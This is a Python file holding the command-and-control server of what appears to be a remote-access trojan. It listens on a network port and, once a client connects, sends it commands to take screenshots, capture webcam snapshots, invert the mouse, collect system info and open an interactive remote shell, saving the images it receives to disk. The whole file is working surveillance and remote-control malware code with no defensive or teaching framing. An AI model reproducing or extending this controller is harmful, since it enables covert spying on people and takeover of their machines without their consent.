import threading
import socket
import os
from shlex import split
# from time import time
server_sock = socket.socket()
server_sock.bind(("0.0.0.0", 5552))
server_sock.listen(5)

# When packet received:
# --------------------------------------------
# |
# | [10 bytes]  [command ID] [data] 
# |  data len+1
# --------------------------------------------

def SEND(msg):
    # A function for sending any data to the client.
    # The format for seding is the above, and thats why
    # we zero-fill the size of the data.
    global conn

    data = f"{len(msg):0>10}{msg}"
    try:
        conn.send(data.encode())
    except ConnectionResetError:
        print("Connection Lost, listening again...")
        conn, addr = server_sock.accept()

def waitForRecv(cmdID, args):
    # After Sending a command, most of the time we'd like
    # to receive from the client. lets wait for input and 
    # act accordingly.
    try:
        # first 10 bytes are the amout of data to be received.
        data_len = int(conn.recv(10))
    except ConnectionResetError:
        print("Client disconnected. waiting again.")
        main()
        return

    data = b""
    # st = time()
    while len(data) < data_len:
        data += conn.recv(4096)
    if cmdID == 's':
        print("[+] Gotten image.")
        # screenshot
        path = os.path.join(*args) if len(args) == 2 else os.path.join(os.getcwd(), args[0])
        with open(path, 'wb') as f:
            f.write(data)
        print(f"[+] Saved as {path}\n")
    elif cmdID == 'C':
        if args == ['list']:
            print(data.decode())
        elif args[0] == 'snap':
            print("[+] Gotten image.")
            # screenshot
            path = os.path.join(*(args[1:])) if len(args) == 3 else args[1]
            with open(path, 'wb') as f:
                f.write(data)
            print(f"[+] Saved as {path}\n")
    else:
        print(data)

def remoteShell():
    global conn
    # import threading

    def poop():
        while True:
            l = int(conn.recv(10))
            data = b""
            while len(data) < l:
                data += conn.recv(1)
            data = data.decode()
            if data == "exit":
                # client sent "exit" so lets stop this thread
                return
            print(data)
    t = threading.Thread(target=poop)
    t.start()

    while True:
        cmd = input()
        if cmd.lower() in ['quit', 'exit']:
            SEND('exit')
            return
        SEND(cmd)


def main():
    global conn
    print("Listening")
    conn, addr = server_sock.accept()
    print("Connected", addr)

    # CnC loop
    while True:
        command = input("> ")
        if command == "quit":
            return
        match split(command):
            case ["pcinfo"]:
                SEND("pcinfo")

            case (["screenshot", *args] | ["s", *args]) if len(args) in (1, 2):
                print("[*] Sending command for screenshot...")
                SEND("s")
                print("[*] Sent. Waiting for response...")
                waitForRecv("s", args)
            case ["screenshot", *args] | ["s", *args]:
                print("Type /help for help (tbc)")

            case ['invertmouse', *args] | ['invert', *args]:
                print("[*] Sending command...")
                SEND(f'I{int(len(args) == 0)}')
                waitForRecv('I', len(args)>0)

            case ['camera', "list"] | ["webcam", "list"]:
                print("[*] Sending command to retrieve cameras...")
                SEND(f"Clist")
                print("[*] Sent")
                waitForRecv('C', ["list"])
            case ['camera', 'snap', ID, *args] if len(args) in (1, 2):
                print(f"[*] Sending command for camera #{ID}")
                SEND(f"Csnap{ID}")
                waitForRecv("C", ['snap', *args])

            case ['shell'] | ['cmd']:
                print("[*] Starting Remote Shell")
                SEND("c")
                remoteShell()

            case _:
                print("Default case?")
                SEND(command)


main()
conn.close()
server_sock.close()
